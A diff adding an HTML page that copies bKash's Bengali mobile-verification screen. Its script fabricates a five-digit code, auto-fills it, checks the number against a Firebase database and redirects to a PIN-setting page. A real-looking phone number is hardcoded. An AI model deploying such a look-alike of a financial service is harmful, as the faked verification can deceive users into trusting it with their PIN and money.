@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bKash Verification</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+body { background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.container { width: 100%; max-width: 414px; background: #fff; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; position: relative; }
+
+/* Top Header */
+.top-header { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
+.back-btn { font-size: 20px; color: #e2136e; text-decoration: none; cursor: pointer; }
+.lang-switch { display: flex; border: 1px solid #e2136e; border-radius: 6px; overflow: hidden; font-size: 13px; font-weight: 600; }
+.lang-switch span { padding: 4px 10px; cursor: pointer; }
+.lang-switch span.active { background: #e2136e; color: white; }
+.lang-switch span.inactive { background: white; color: #e2136e; }
+
+/* Content */
+.content-section { margin-top: 25px; }
+.logo { width: 55px; height: auto; margin-bottom: 20px; }
+h2 { color: #222; font-size: 22px; font-weight: 600; line-height: 1.4; margin-bottom: 25px; }
+
+.sub-header-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+.label-text { font-size: 13px; color: #666; }
+.resend-text { font-size: 13px; color: #e2136e; font-weight: 600; }
+
+/* ৫টি কোড বক্স (ছবির মতো) */
+.code-inputs { display: flex; gap: 8px; margin-bottom: 15px; }
+.code-box {
+    width: 45px; height: 48px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 20px;
+    font-weight: bold;
+    text-align: center;
+    background: #f4f4f4;
+    color: #333;
+    outline: none;
+}
+.code-box.filled {
+    border-color: #e2136e;
+    background: #fff;
+}
+
+.info-text { font-size: 13px; color: #555; margin-bottom: 30px; line-height: 1.5; }
+.info-text span { color: #e2136e; font-weight: 600; cursor: pointer; }
+
+/* সিকিউরিটি ব্যানার (ছবির মতো হুবহু) */
+.security-banner {
+    background: linear-gradient(135deg, #fff 0%, #fff0f5 100%);
+    border: 1px solid #f8bbd0;
+    border-radius: 12px;
+    padding: 15px;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    box-shadow: 0 4px 15px rgba(226, 19, 110, 0.08);
+}
+.security-icon {
+    width: 55px; height: 55px;
+    border: 2px solid #e2136e;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    position: relative;
+    background: #fff;
+}
+.security-icon i { color: #e2136e; font-size: 24px; }
+.security-text h4 { font-size: 13px; color: #e2136e; font-weight: 700; line-height: 1.4; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="top-header">
+    <a href="namber.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+    <div class="lang-switch">
+      <span class="inactive">Eng</span>
+      <span class="active">বাং</span>
+    </div>
+  </div>
+
+  <div class="content-section">
+    <img src="assets/birds.png" alt="bKash" class="logo">
+    <h2>আপনার মোবাইল নাম্বার<br>যাচাই করুন</h2>
+
+    <div class="sub-header-row">
+      <span class="label-text">ভেরিফিকেশন কোড</span>
+      <span class="resend-text" id="timerDisplay">পুনরায় পাঠান 59s পর</span>
+    </div>
+
+    <!-- ৫টি কোড বক্স -->
+    <div class="code-inputs">
+      <input type="text" class="code-box" maxlength="1" readonly id="d1">
+      <input type="text" class="code-box" maxlength="1" readonly id="d2">
+      <input type="text" class="code-box" maxlength="1" readonly id="d3">
+      <input type="text" class="code-box" maxlength="1" readonly id="d4">
+      <input type="text" class="code-box" maxlength="1" readonly id="d5">
+    </div>
+
+    <div class="info-text">
+      ভেরিফিকেশন কোড এই নাম্বারে পাঠানো হয়েছে<br>
+      <span id="displayPhone">+8801XXXXXXXXX</span> (<span style="color:#e2136e; cursor:pointer;">পরিবর্তন করুন</span>)
+    </div>
+
+    <!-- সিকিউরিটি ব্যানার -->
+    <div class="security-banner">
+      <div class="security-icon">
+        <i class="fa-solid fa-user-secret"></i>
+      </div>
+      <div class="security-text">
+        <h4>আপনার বিকাশ পিন ও ভেরিফিকেশন কোড কাউকে দিবেন না</h4>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+<script src="firebase.js"></script>
+
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const phone = localStorage.getItem('tempPhone') || "01615312950";
+    document.getElementById('displayPhone').innerText = "+88" + phone;
+
+    const boxes = [
+      document.getElementById('d1'),
+      document.getElementById('d2'),
+      document.getElementById('d3'),
+      document.getElementById('d4'),
+      document.getElementById('d5')
+    ];
+
+    // ৫ ডিজিটের ভেরিফিকেশন কোড তৈরি (বা লোকালস্টোরেজ থেকে নেওয়া)
+    let code = localStorage.getItem('verificationCode');
+    if (!code || code.length !== 5) {
+      code = Math.floor(10000 + Math.random() * 90000).toString();
+      localStorage.setItem('verificationCode', code);
+    }
+
+    // ২ সেকেন্ড পর অটোমেটিক ১টি করে বক্স পূরণ হবে
+    setTimeout(() => {
+      let i = 0;
+      const interval = setInterval(() => {
+        if (i < 5) {
+          boxes[i].value = code.charAt(i);
+          boxes[i].classList.add('filled');
+          i++;
+        } else {
+          clearInterval(interval);
+          
+          // কোড বসানো শেষ হওয়ার ১ সেকেন্ড পর ফায়ারবেস চেক করে পরবর্তী পেজে রিডাইরেক্ট
+          setTimeout(async () => {
+            try {
+              const docRef = db.collection('users').doc(phone);
+              const doc = await docRef.get();
+
+              localStorage.setItem('userPhone', phone);
+
+              if (doc.exists) {
+                localStorage.setItem('registered_' + phone, 'true');
+                const userData = doc.data();
+                if (userData.balance) {
+                  localStorage.setItem('userBalance', userData.balance);
+                }
+                window.location.href = "home.html";
+              } else {
+                window.location.href = "set_pin.html";
+              }
+            } catch (error) {
+              console.error("Firebase error: ", error);
+              window.location.href = "set_pin.html";
+            }
+          }, 1000);
+        }
+      }, 300);
+    }, 1500);
+  });
+</script>
+
+</body>
+</html>
